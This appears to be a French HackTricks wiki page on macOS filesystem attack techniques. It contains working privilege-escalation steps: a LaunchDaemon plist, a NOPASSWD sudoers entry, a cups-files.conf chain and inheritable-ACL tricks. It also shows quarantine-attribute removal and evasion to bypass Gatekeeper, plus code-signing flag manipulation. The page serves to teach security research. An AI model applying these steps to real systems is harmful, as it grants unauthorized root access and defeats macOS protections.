# Astuces FS de macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Combinaisons de permissions POSIX

Permissions dans un **répertoire** :

- **read** - vous pouvez **énumérer** les entrées du répertoire
- **write** - vous pouvez **supprimer/écrire** des **fichiers** dans le répertoire et vous pouvez **supprimer des dossiers vides**.
- Mais vous **ne pouvez pas supprimer/modifier des dossiers non vides** sauf si vous disposez des permissions d'écriture sur ceux-ci.
- Vous **ne pouvez pas modifier le nom d'un dossier** sauf si vous en êtes propriétaire.
- **execute** - vous êtes **autorisé à parcourir** le répertoire - si vous ne disposez pas de ce droit, vous ne pouvez accéder à aucun fichier qu'il contient, ni à aucun sous-répertoire.

### Combinaisons dangereuses

**Comment écraser un fichier/dossier appartenant à root**, lorsque :

- Le propriétaire d'un **répertoire parent** dans le chemin est l'utilisateur
- Le propriétaire d'un **répertoire parent** dans le chemin est un **groupe d'utilisateurs** disposant d'un **accès en écriture**
- Un **groupe d'utilisateurs** dispose d'un accès en **écriture** au **fichier**

Avec l'une des combinaisons précédentes, un attaquant pourrait **injecter** un **sym/hard link** vers le chemin attendu afin d'obtenir une écriture arbitraire privilégiée.

### Cas particulier du dossier root R+X

S'il y a des fichiers dans un **répertoire** auquel **seul root dispose d'un accès R+X**, ces fichiers sont **inaccessibles à tous les autres utilisateurs**. Ainsi, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, mais qui ne peut pas être lu en raison de cette **restriction**, de ce dossier **vers un autre**, pourrait être exploitée pour lire ces fichiers.

Exemple dans : [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Fichier/dossier permissif

Si un processus privilégié écrit des données dans un **fichier** qui pourrait être **contrôlé** par un utilisateur **moins privilégié**, ou qui pourrait avoir été **préalablement créé** par un utilisateur moins privilégié, l'utilisateur pourrait simplement **le faire pointer vers un autre fichier** via un Symbolic ou Hard link, et le processus privilégié écrirait dans ce fichier.

Consultez les autres sections pour voir où un attaquant pourrait **exploiter une écriture arbitraire afin d'élever ses privilèges**.

### Open `O_NOFOLLOW`

Selon [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) : *« Si `O_NOFOLLOW` est utilisé dans le masque et que le fichier cible passé à `open()` est un lien symbolique, alors `open()` échouera. »* Seul le composant **final** est vérifié — chaque composant **intermédiaire** est toujours résolu et suivi. Ainsi, un développeur qui a « protégé » une écriture avec `O_NOFOLLOW` peut toujours être attaqué par le placement d'un symlink sur n'importe quel **répertoire parent** du chemin cible.

La même page de manuel documente les flags qui ferment réellement cette faille :

- **`O_NOFOLLOW_ANY`** — *« si ... un composant quelconque du chemin passé à `open()` est un lien symbolique, alors `open()` échouera. »*
- **`O_RESOLVE_BENEATH`** — *« si ... la résolution du chemin spécifié sort du répertoire associé au fd, alors `openat()` échouera. »*

Sinon, `openat()` relatif à un FD de répertoire que vous avez déjà validé, ou `realpath()` + une nouvelle validation, sont les moyens restants d'empêcher les remplacements de symlink au milieu du chemin.

## .fileloc

Les fichiers avec l'extension **`.fileloc`** peuvent pointer vers d'autres applications ou binaires ; lorsqu'ils sont ouverts, l'application/le binaire sera celui qui sera exécuté.\
Exemple :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Descripteurs de fichiers

### Leak FD (no `O_CLOEXEC`)

Si un appel à `open` n'utilise pas le flag `O_CLOEXEC`, le descripteur de fichier sera hérité par le processus enfant. Ainsi, si un processus privilégié ouvre un fichier privilégié et exécute un processus contrôlé par l'attaquant, l'attaquant **héritera du FD vers le fichier privilégié**.

L'exemple canonique est le **LPE `DYLD_PRINT_TO_FILE` dans OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)) :

- `dyld` respectait `DYLD_PRINT_TO_FILE=/path` même dans les **binaires restricted (suid root)**, car cette variable particulière était analysée en dehors de `processDyldEnvironmentVariable()`.
- Il exécutait `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, et **créait donc un fichier appartenant à root à un emplacement arbitraire**.
- Le FD **n'était jamais fermé et ne possédait pas de flag close-on-exec**, de sorte que chaque enfant du binaire suid héritait d'un **FD accessible en écriture vers un fichier appartenant à root**.
- L'exécution, par exemple, de `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, puis la lecture du numéro du FD hérité dans l'enfant, permettait d'effectuer des écritures arbitraires dans des fichiers appartenant à root ; `fcntl(fd, F_SETFL, 0)` permettait même de supprimer `O_APPEND` afin d'autoriser l'écrasement au lieu de l'ajout.

La même situation se produit lorsqu'un processus privilégié ouvre un fichier **avant** d'effectuer un `exec` vers quelque chose que vous contrôlez (outils auxiliaires, éditeurs de type `crontab` invoqués via `$EDITOR`, fichiers de log/debug ouverts depuis un chemin fourni par une variable d'environnement...). Énumérez les FD dont vous avez hérité avec :
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Tout ce qui est supérieur à `2` et qui pointe vers un fichier que vous ne pouvez pas ouvrir vous-même constitue une primitive d'arbitrary-write (ou d'arbitrary-read).

## Éviter les tricks liés aux quarantine xattrs

### Supprimez-la
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Si un fichier/dossier possède cet attribut immutable, il ne sera pas possible de lui attribuer un xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Systèmes de fichiers sans prise en charge de xattr

Tous les systèmes de fichiers que macOS peut monter ne stockent pas nativement les **attributs étendus**. HFS+ et APFS les prennent en charge, mais **FAT32, exFAT et la plupart des montages NFS ne le font pas** — macOS les émule en écrivant un fichier auxiliaire **AppleDouble** nommé `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).

Cela est important pour la quarantine, car le xattr ne subsiste que s’il peut effectivement être écrit **et relu** depuis le même volume :
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Si le volume est ensuite lu via un chemin qui ignore le fichier compagnon `._` (ou si le fichier compagnon est supprimé), le fichier arrive **sans indicateur de quarantine** — et un `.app` sans quarantine suffit à échapper à l'App Sandbox, comme expliqué dans [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Cet ACL empêche l'ajout de `xattrs` au fichier
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Le format de fichier **AppleDouble** copie un fichier, y compris ses ACEs.

Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle de l'ACL stockée dans le xattr appelé **`com.apple.acl.text`** va être définie comme ACL dans le fichier décompressé. Ainsi, si vous compressez une application dans un fichier zip au format **AppleDouble** avec une ACL qui empêche l'écriture d'autres xattrs... le xattr quarantine n'était pas défini dans l'application :

Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.

Pour reproduire cela, nous devons d'abord obtenir la chaîne ACL correcte :
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Notez que même si cela fonctionne, le sandbox écrit auparavant le xattr de quarantine)

Pas vraiment nécessaire, mais je le laisse ici au cas où :


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass des vérifications de signature

### Bypass des vérifications des platform binaries

Certaines vérifications de sécurité vérifient si le binaire est un **platform binary**, par exemple pour autoriser la connexion à un service XPC. Cependant, comme présenté dans un bypass sur https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, il est possible de bypass cette vérification en récupérant un platform binary (comme /bin/ls) et en injectant l'exploit via dyld à l'aide d'une variable d'environnement `DYLD_INSERT_LIBRARIES`.

### Bypass des flags `CS_REQUIRE_LV` et `CS_FORCED_LV`

Un binaire en cours d'exécution peut modifier ses propres flags afin de bypass les vérifications avec un code tel que :
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Les bundles contiennent le fichier **`_CodeSignature/CodeResources`**, qui contient le **hash** de chaque **fichier** du **bundle**. Notez que le hash de CodeResources est également **intégré dans l’exécutable**, nous ne pouvons donc pas non plus le modifier.

Cependant, certains fichiers ne verront pas leur signature vérifiée. Ils possèdent la clé `omit` dans le plist, comme :
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Il est possible de calculer la signature d'une ressource depuis la CLI avec :
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Monter des dmg

Un utilisateur peut monter un dmg personnalisé, même par-dessus certains dossiers existants. Voici comment créer un package dmg personnalisé avec du contenu personnalisé :
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Habituellement, macOS monte les disques en communiquant avec le service Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fourni par `/usr/libexec/diskarbitrationd`). Si vous ajoutez le paramètre `-d` au fichier plist de LaunchDaemons et redémarrez, les journaux seront enregistrés dans `/var/log/diskarbitrationd.log`.\
Cependant, il est possible d'utiliser des outils comme `hdik` et `hdiutil` pour communiquer directement avec le kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Si votre script peut être interprété comme un **shell script**, vous pouvez écraser le shell script **`/etc/periodic/daily/999.local`**, qui sera exécuté chaque jour.

Vous pouvez **simuler l'exécution de ce script** avec : **`sudo periodic daily`**

### Daemons

Écrivez un **LaunchDaemon** arbitraire comme **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, avec un plist exécutant un script arbitraire comme suit :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Générez simplement le script `/Applications/Scripts/privesc.sh` avec les **commandes** que vous souhaitez exécuter en tant que root.

### Fichier sudoers

Si vous disposez d'un **arbitrary write**, vous pouvez créer un fichier dans le dossier **`/etc/sudoers.d/`** afin de vous accorder des privilèges **sudo**.

### Fichiers PATH

Le fichier **`/etc/paths`** est l'un des principaux emplacements qui alimentent la variable d'environnement PATH. Vous devez être root pour l'écraser, mais si un script d'un **processus privilégié** exécute une **commande sans le chemin complet**, vous pourriez être en mesure de la **hijack** en modifiant ce fichier.

Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour charger de nouveaux dossiers dans la variable d'environnement `PATH`.

### cups-files.conf

Cette technique a été utilisée dans [ce writeup](https://www.kandji.io/blog/macos-audit-story-part1).

Créez le fichier `/etc/cups/cups-files.conf` avec le contenu suivant :
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Cela créera le fichier `/etc/sudoers.d/lpe` avec les permissions 777. Le contenu supplémentaire à la fin sert à déclencher la création du journal d'erreurs.

Ensuite, écrivez dans `/etc/sudoers.d/lpe` la configuration nécessaire pour escalader les privilèges, comme `%staff ALL=(ALL) NOPASSWD:ALL`.

Puis, modifiez à nouveau le fichier `/etc/cups/cups-files.conf` en indiquant `LogFilePerm 700`, afin que le nouveau fichier sudoers devienne valide lors de l'appel à `cupsctl`.

### Évasion de la sandbox

Il est possible de s'échapper de la sandbox macOS grâce à une écriture arbitraire FS. Pour quelques exemples, consultez la page [macOS Auto Start](../../../../macos-auto-start-locations.md), mais une méthode courante consiste à écrire un fichier de préférences Terminal dans `~/Library/Preferences/com.apple.Terminal.plist` qui exécute une commande au démarrage, puis à l'appeler avec `open`.

## Générer des fichiers accessibles en écriture en tant que d'autres utilisateurs

Une primitive de privesc très courante consiste à faire en sorte qu'un **processus privilégié crée un fichier pour vous** dans un répertoire que vous contrôlez, tout en conservant l'**accès en écriture** à ce fichier. Deux éléments sont nécessaires :

1. Un répertoire qui vous appartient (ou dans lequel vous pouvez définir une **ACL héritable**), afin que tout ce qui y est créé hérite de vos permissions.
2. Un processus privilégié/`suid` auquel il est possible d'indiquer **où** créer un fichier — généralement via une variable d'environnement de debug/logging, un fichier de configuration ou l'API XPC d'un helper.

La partie **ACL héritable** permet au fichier créé d'être accessible en écriture par vous, même s'il appartient à un autre utilisateur. Les flags d'héritage `file_inherit` / `directory_inherit` sont documentés dans [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) :
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Désormais, tout fichier qu’un processus privilégié crée dans `$DIRNAME` est **accessible en écriture par vous**. Si ce répertoire est également un emplacement dont le contenu est ensuite **exécuté en tant que root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, un répertoire de LaunchDaemon...), il s’agit d’une escalade directe vers root. Consultez les sections [Sudoers File](#sudoers-file) et [cups-files.conf](#cups-filesconf) ci-dessus pour savoir quoi écrire une fois le fichier obtenu.

Pour un exemple complet de la chaîne « une variable d’environnement fait en sorte qu’un processus root crée un fichier, et le FD vous est leak », consultez la section [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) ci-dessus.

## Mémoire partagée POSIX

La **mémoire partagée POSIX** permet aux processus des systèmes d’exploitation conformes à POSIX d’accéder à une zone mémoire commune, facilitant une communication plus rapide que les autres méthodes de communication inter-processus. Elle consiste à créer ou ouvrir un objet de mémoire partagée avec `shm_open()`, à définir sa taille avec `ftruncate()`, puis à le mapper dans l’espace d’adressage du processus à l’aide de `mmap()`. Les processus peuvent ensuite lire et écrire directement dans cette zone mémoire. Pour gérer les accès concurrents et éviter la corruption des données, des mécanismes de synchronisation tels que les mutex ou les sémaphores sont souvent utilisés. Enfin, les processus dé-mappent et ferment la mémoire partagée avec `munmap()` et `close()`, et peuvent éventuellement supprimer l’objet mémoire avec `shm_unlink()`. Ce système est particulièrement efficace pour l’IPC rapide et performant dans les environnements où plusieurs processus doivent accéder rapidement à des données partagées.

<details>

<summary>Exemple de code du producteur</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Exemple de code du consommateur</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** sont une fonctionnalité de sécurité introduite dans macOS pour améliorer la sécurité et la fiabilité des **opérations sur les descripteurs de fichiers** dans les applications utilisateur. Ces descripteurs protégés permettent d'associer des restrictions spécifiques, ou « guards », aux descripteurs de fichiers, lesquelles sont appliquées par le kernel.

Cette fonctionnalité est particulièrement utile pour empêcher certaines catégories de vulnérabilités, telles que **l'accès non autorisé aux fichiers** ou les **race conditions**. Ces vulnérabilités apparaissent notamment lorsqu'un thread accède à une description de fichier, donnant ainsi **à un autre thread vulnérable un accès à celle-ci**, ou lorsqu'un descripteur de fichier est **hérité** par un processus enfant vulnérable. Certaines fonctions liées à cette fonctionnalité sont :

- `guarded_open_np` : ouvre un FD avec un guard
- `guarded_close_np` : le ferme
- `change_fdguard_np` : modifie les flags du guard sur un descripteur, y compris en supprimant la protection du guard

## References

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD leak sans close-on-exec)
- [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [`open(2)` page de manuel](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [`chmod(1)` page de manuel](https://keith.github.io/xcode-man-pages/chmod.1.html) (flags d'héritage ACL)
- [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

{{#include ../../../../banners/hacktricks-training.md}}
